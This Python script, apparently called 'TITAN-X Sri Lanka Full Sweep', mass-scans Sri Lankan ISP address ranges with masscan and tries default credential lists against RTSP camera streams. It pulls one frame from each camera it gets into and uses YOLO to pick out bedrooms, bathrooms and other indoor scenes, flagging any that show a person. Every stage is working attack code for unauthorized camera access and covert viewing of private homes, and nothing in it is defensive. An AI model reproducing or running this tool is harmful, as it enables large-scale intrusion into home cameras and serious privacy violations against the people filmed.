#!/usr/bin/env python3
"""
TITAN-X Sri Lanka Full Sweep — NO TARGET LIMIT
Scans ALL Sri Lanka IP space, probes EVERY camera found, classifies with YOLO.
"""
import subprocess, os, json, sys, time, shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

CREDS = [
    ('admin', '12345'), ('admin', ''), ('admin', 'admin'), ('admin', '1234'),
    ('admin', '123456'), ('admin', '1111'), ('admin', '888888'), ('admin', '666666'),
    ('root', ''), ('root', 'pass'), ('root', '1234'), ('root', 'root'),
    ('root', 'vizxv'), ('root', 'xc3511'), ('supervisor', 'supervisor'),
    ('ubnt', 'ubnt'), ('admin', 'password'), ('admin', 'admin123'),
]

RTSP_PATHS = [
    '/Streaming/Channels/101',
    '/Streaming/Channels/1',
    '/h264/ch1/main/av_stream',
    '/cam/realmonitor?channel=1&subtype=0',
    '/stream1',
    '/live/ch00_0',
    '/onvif1',
    '/11',
]

# Full Sri Lanka IP allocation (APNIC)
SRI_LANKA_CIDRS = [
    # SLT (Sri Lanka Telecom) — largest ISP
    '112.134.0.0/15',    # 112.134.0.0 - 112.135.255.255
    '220.247.0.0/17',    # SLT broadband
    '203.143.0.0/17',    # SLT
    '203.115.0.0/17',    # SLT legacy
    # Dialog (largest mobile + broadband)
    '124.43.0.0/16',     # Dialog broadband
    '175.157.0.0/16',    # Dialog 4G
    # Mobitel
    '192.248.0.0/16',    # Lanka Education & Research Network + various
    # Lanka Bell
    '103.0.0.0/16',      # Various LK allocations
    # Airtel / Hutchison
    '116.206.0.0/15',    # Hutchison
    # General LK allocations
    '43.224.0.0/14',     # APNIC LK block
    '103.21.0.0/16',     # LK enterprises
    '103.24.0.0/14',     # LK range
    '202.21.0.0/16',     # Legacy LK
    '202.69.0.0/16',     # LK
    '61.245.160.0/19',   # SLT
    '122.255.0.0/16',    # LK ISPs
    '180.232.0.0/14',    # Dialog/SLT
    '110.12.0.0/15',     # LK mobile
    '117.247.0.0/16',    # LK
    '123.231.0.0/16',    # LK
    '150.129.0.0/16',    # LK
    '163.32.0.0/16',     # LK
]

INDOOR_SCENES = {'bedroom', 'dining_room', 'kitchen', 'living_room', 'office', 'bathroom', 'indoor', 'wardrobe'}

SCENE_MAP = {
    'bed': 'bedroom', 'teddy bear': 'bedroom', 'hair drier': 'bedroom',
    'dining table': 'dining_room', 'bowl': 'dining_room', 'cup': 'dining_room',
    'wine glass': 'dining_room', 'fork': 'dining_room', 'knife': 'dining_room',
    'spoon': 'dining_room', 'bottle': 'dining_room',
    'refrigerator': 'kitchen', 'oven': 'kitchen', 'microwave': 'kitchen',
    'sink': 'kitchen', 'toaster': 'kitchen',
    'sofa': 'living_room', 'couch': 'living_room', 'tv': 'living_room',
    'remote': 'living_room', 'vase': 'living_room',
    'laptop': 'office', 'keyboard': 'office', 'mouse': 'office',
    'book': 'office', 'clock': 'office', 'tie': 'office', 'scissors': 'office',
    'chair': 'indoor', 'potted plant': 'indoor', 'handbag': 'indoor',
    'suitcase': 'indoor',
    'toilet': 'bathroom', 'toothbrush': 'bathroom',
    'car': 'outside', 'truck': 'outside', 'bus': 'outside', 'bicycle': 'outside',
    'motorcycle': 'outside', 'traffic light': 'outside', 'stop sign': 'outside',
    'fire hydrant': 'outside', 'parking meter': 'outside', 'bench': 'outside',
    'dog': 'outside', 'bird': 'outside', 'skateboard': 'outside',
    'person': 'has_person',
}

WORK_DIR = '/root/vmos-titan-unified/vmos_titan/playground/cctv-tool'
FRAME_DIR = os.path.join(WORK_DIR, 'hunt_frames')
SCENE_DIR = os.path.join(WORK_DIR, 'hunt_scenes')
os.makedirs(FRAME_DIR, exist_ok=True)
os.makedirs(SCENE_DIR, exist_ok=True)


def masscan_srilanka(rate=500000):
    """Masscan ALL Sri Lanka IP space — ports 554, 8000, 80, 443, 8200"""
    cidr_file = '/tmp/hunt_cidr_LK.txt'
    result_file = '/tmp/hunt_masscan_LK.txt'

    with open(cidr_file, 'w') as f:
        f.write('\n'.join(SRI_LANKA_CIDRS))

    # Scan more ports for wider coverage
    cmd = ['masscan', '-iL', cidr_file, '-p', '554,8000,80,443,8200,9010',
           '--rate', str(rate), '--open-only', '-oG', result_file,
           '--exclude', '255.255.255.255']
    print(f'  [LK] Scanning {len(SRI_LANKA_CIDRS)} CIDR ranges @ {rate} pps...', flush=True)
    print(f'  [LK] Ports: 554 (RTSP), 8000 (Hik), 80/443 (HTTP), 8200, 9010', flush=True)

    try:
        subprocess.run(cmd, capture_output=True, timeout=300, text=True)
    except subprocess.TimeoutExpired:
        print(f'  [LK] masscan timeout (5 min cap)', flush=True)

    ips_by_port = {}
    if os.path.exists(result_file):
        with open(result_file) as f:
            for line in f:
                if line.startswith('#') or not line.strip():
                    continue
                ip = port_num = None
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == 'Host:' and i + 1 < len(parts):
                        ip = parts[i + 1]
                    if 'Ports:' in p and i + 1 < len(parts):
                        port_num = parts[i + 1].split('/')[0]
                if ip and port_num:
                    ips_by_port.setdefault(ip, set()).add(port_num)

    dual = [ip for ip, p in ips_by_port.items() if '554' in p and '8000' in p]
    rtsp_only = [ip for ip, p in ips_by_port.items() if '554' in p and ip not in dual]
    hik_only = [ip for ip, p in ips_by_port.items() if '8000' in p and ip not in dual]
    http_only = [ip for ip, p in ips_by_port.items() if ('80' in p or '443' in p) and ip not in dual and ip not in rtsp_only and ip not in hik_only]

    total = len(ips_by_port)
    print(f'  [LK] {total} unique hosts found', flush=True)
    print(f'  [LK] {len(dual)} dual (554+8000) | {len(rtsp_only)} RTSP-only | {len(hik_only)} Hik-only | {len(http_only)} HTTP-only', flush=True)

    # Priority order: dual → RTSP → Hik → HTTP
    all_targets = dual + rtsp_only + hik_only
    return all_targets, total, len(dual), len(rtsp_only), len(hik_only)


def probe_rtsp(ip):
    """Fast RTSP probe — tries all cred+path combos"""
    for user, passwd in CREDS:
        for rpath in RTSP_PATHS:
            auth = f'{user}:{passwd}@' if passwd else f'{user}:@'
            rtsp_url = f'rtsp://{auth}{ip}:554{rpath}'
            frame = os.path.join(FRAME_DIR, f'frame_{ip.replace(".", "_")}.jpg')
            try:
                r = subprocess.run(
                    ['ffmpeg', '-rtsp_transport', 'tcp', '-i', rtsp_url,
                     '-vframes', '1', '-f', 'image2', '-y', frame],
                    capture_output=True, timeout=2, text=True
                )
                if r.returncode == 0 and os.path.exists(frame) and os.path.getsize(frame) > 1000:
                    return {
                        'ip': ip, 'user': user, 'password': passwd,
                        'rtsp_url': rtsp_url, 'rtsp_path': rpath,
                        'frame_file': frame, 'frame_size': os.path.getsize(frame),
                        'country': 'LK',
                    }
            except (subprocess.TimeoutExpired, Exception):
                pass
            try:
                if os.path.exists(frame) and os.path.getsize(frame) <= 1000:
                    os.remove(frame)
            except:
                pass
    return None


def classify_frame(model, frame_path):
    """YOLO scene classification"""
    if not model or not os.path.exists(frame_path):
        return None
    try:
        results = model(frame_path, conf=0.15, verbose=False)
        detections = []
        scene_votes = {}
        for r in results:
            for box in r.boxes:
                cls = r.names[int(box.cls)]
                conf = float(box.conf)
                detections.append({'object': cls, 'confidence': round(conf, 3)})
                scene = SCENE_MAP.get(cls)
                if scene and scene != 'has_person':
                    scene_votes[scene] = scene_votes.get(scene, 0) + conf
        has_person = any(d['object'] == 'person' for d in detections)
        if not scene_votes:
            return {'scene': 'unclassified', 'confidence': 0, 'objects': detections, 'has_person': has_person}
        best = max(scene_votes, key=scene_votes.get)
        return {'scene': best, 'confidence': round(scene_votes[best], 3),
                'objects': detections, 'votes': {k: round(v, 3) for k, v in scene_votes.items()},
                'has_person': has_person}
    except Exception:
        return None


def main():
    print(f'{"="*80}', flush=True)
    print(f'TITAN-X SRI LANKA FULL SWEEP — NO TARGET LIMIT', flush=True)
    print(f'Country: Sri Lanka (LK)', flush=True)
    print(f'Target Scenes: bedroom, dining_room, kitchen, living_room, office, wardrobe, bathroom', flush=True)
    print(f'Config: {len(CREDS)} creds x {len(RTSP_PATHS)} paths | 80 workers | 5s timeout', flush=True)
    print(f'Mode: PROBE ALL — no cap on targets', flush=True)
    print(f'Started: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}\n', flush=True)

    # Load YOLO
    try:
        from ultralytics import YOLO
        model_path = os.path.join(WORK_DIR, 'yolo11n.pt')
        if not os.path.exists(model_path):
            model_path = 'yolov8n.pt'
        yolo = YOLO(model_path)
        print(f'[+] YOLO loaded: {model_path}\n', flush=True)
    except Exception as e:
        print(f'[!] YOLO failed: {e} — will skip classification', flush=True)
        yolo = None

    # === PHASE 1: MASSCAN ===
    print(f'{"="*60}', flush=True)
    print(f'[PHASE 1] MASSCAN — SRI LANKA (FULL IP SPACE)', flush=True)
    print(f'{"="*60}', flush=True)

    targets, total_hosts, dual, rtsp_only, hik_only = masscan_srilanka(rate=500000)

    if not targets:
        print('[!] No targets found. Exiting.', flush=True)
        return

    # NO LIMIT — probe ALL targets
    print(f'\n  >>> PROBING ALL {len(targets)} CAMERA TARGETS (NO LIMIT) <<<\n', flush=True)

    # === PHASE 2: RTSP PROBE ===
    print(f'[PHASE 2] RTSP PROBE — LK | {len(targets)} targets | 80 workers', flush=True)
    streams = []
    done = 0
    t0 = time.time()

    with ThreadPoolExecutor(max_workers=120) as pool:
        futures = {pool.submit(probe_rtsp, ip): ip for ip in targets}
        for fut in as_completed(futures):
            done += 1
            try:
                r = fut.result()
                if r:
                    streams.append(r)
                    el = time.time() - t0
                    print(f'  [{done}/{len(targets)}] *** STREAM #{len(streams)}: {r["ip"]} | {r["user"]}:{r["password"]} | {r["frame_size"]:,}B | {el:.0f}s', flush=True)
            except Exception:
                pass
            if done % 200 == 0:
                el = time.time() - t0
                rate = done / max(el, 1)
                eta = (len(targets) - done) / max(rate, 0.1)
                print(f'  [{done}/{len(targets)}] {el:.0f}s | {len(streams)} streams | {rate:.1f} IPs/s | ETA {eta:.0f}s', flush=True)

    el = time.time() - t0
    print(f'\n  [LK] RTSP DONE: {len(streams)} streams from {len(targets)} targets in {el:.0f}s', flush=True)

    if not streams:
        print('[!] No streams found. Exiting.', flush=True)
        return

    # === PHASE 3: YOLO CLASSIFY ===
    print(f'\n[PHASE 3] YOLO CLASSIFY — LK | {len(streams)} frames', flush=True)
    indoor_count = 0
    
    def classify_batch(stream_batch):
        results = []
        for s in stream_batch:
            cls = classify_frame(yolo, s['frame_file'])
            results.append((s, cls))
        return results
    
    # Batch classification for speed
    batch_size = 20
    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = []
        for i in range(0, len(streams), batch_size):
            batch = streams[i:i+batch_size]
            futures.append(pool.submit(classify_batch, batch))
        
        for fut in as_completed(futures):
            for s, cls in fut.result():
                if cls:
                    s['scene'] = cls
                    scene = cls['scene']
                    objs = [d['object'] for d in cls.get('objects', [])]
                    is_indoor = scene in INDOOR_SCENES
                    person_tag = ' [PERSON]' if cls.get('has_person') else ''
                    marker = f' *** INDOOR MATCH ***{person_tag}' if is_indoor else (person_tag if person_tag else '')
                    print(f'  {s["ip"]:>16} | {scene:>14} ({cls["confidence"]:.2f}) | {objs}{marker}', flush=True)
                    if is_indoor:
                        indoor_count += 1
                        dst = os.path.join(SCENE_DIR, f'LK_{scene}_{s["ip"].replace(".", "_")}.jpg')
                        try:
                            shutil.copy2(s['frame_file'], dst)
                        except:
                            pass
                        s['scene_file'] = dst
                else:
                    s['scene'] = {'scene': 'unclassified', 'confidence': 0, 'objects': []}
                    print(f'  {s["ip"]:>16} | {"unclassified":>14} (dark/blank)', flush=True)

    # === FINAL REPORT ===
    print(f'\n{"="*80}', flush=True)
    print(f'SRI LANKA SCAN COMPLETE — {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', flush=True)
    print(f'{"="*80}', flush=True)
    print(f'  Masscan:  {total_hosts} hosts ({dual} dual, {rtsp_only} RTSP, {hik_only} Hik)', flush=True)
    print(f'  Probed:   {len(targets)} targets (ALL — no cap)', flush=True)
    print(f'  Streams:  {len(streams)} live', flush=True)
    print(f'  Indoor:   {indoor_count} matches', flush=True)
    print(f'  Time:     {el:.0f}s', flush=True)

    scene_counts = {}
    for s in streams:
        sc = s.get('scene', {}).get('scene', 'unclassified')
        scene_counts[sc] = scene_counts.get(sc, 0) + 1

    print(f'\nScene Breakdown:', flush=True)
    for sc, cnt in sorted(scene_counts.items(), key=lambda x: -x[1]):
        marker = ' *** TARGET' if sc in INDOOR_SCENES else ''
        print(f'  {sc:>18}: {cnt}{marker}', flush=True)

    if streams:
        print(f'\n=== ALL STREAMS ({len(streams)}) ===', flush=True)
        for i, s in enumerate(streams, 1):
            sc = s.get('scene', {})
            scene_name = sc.get('scene', '?')
            objs = ', '.join(f'{d["object"]}({d["confidence"]:.0%})' for d in sc.get('objects', []))
            is_indoor = scene_name in INDOOR_SCENES
            tag = ' <<< INDOOR' if is_indoor else ''
            print(f'  {i:>3}. {s["ip"]:>16} | {scene_name:>14} ({sc.get("confidence",0):.2f}) | {s["user"]}:{s["password"]}{tag}', flush=True)
            print(f'       RTSP: {s["rtsp_url"]}', flush=True)
            if objs:
                print(f'       Objects: {objs}', flush=True)

    # Save results
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_file = os.path.join(WORK_DIR, f'hunt_srilanka_{ts}.json')
    save_data = {
        'country': 'LK', 'scan_time': ts,
        'masscan': {'total': total_hosts, 'dual': dual, 'rtsp': rtsp_only, 'hik': hik_only},
        'probed': len(targets), 'streams_found': len(streams), 'indoor_matches': indoor_count,
        'streams': [{k: v for k, v in s.items() if k not in ('frame_file', 'scene_file')} for s in streams],
    }
    with open(out_file, 'w') as f:
        json.dump(save_data, f, indent=2, default=str)
    print(f'\n[+] Results saved: {out_file}', flush=True)
    print(f'\n*** SCAN COMPLETE — CHECK RESULTS ABOVE ***', flush=True)


if __name__ == '__main__':
    main()
